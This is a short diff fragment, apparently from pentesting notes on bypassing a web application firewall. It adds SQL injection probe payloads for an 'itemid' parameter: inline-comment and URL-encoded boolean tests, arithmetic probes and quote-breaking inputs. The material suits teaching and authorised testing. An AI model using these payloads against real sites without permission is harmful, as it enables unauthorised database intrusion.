@@ -459,7 +459,24 @@ This is where real pentesting starts: WAF Bypass
 10088%09AND%091=1
 10088%0aAND%0a1=1
 
-1. Inline comment trick
+2. Inline comment trick
    
+10088'/**/AND/**/1=1-- 
+
+3. Encoded payload
+   
+10088%20AND%201=1
+
+4. Use arithmetic instead (very smart)
+   
+itemid=10088+1
+itemid=10088-1
+itemid=10088*1
+
+4. Try breaking logic without keywords
+   
+itemid=10088'
+itemid=10088''
+itemid=10088'''
 
 ```
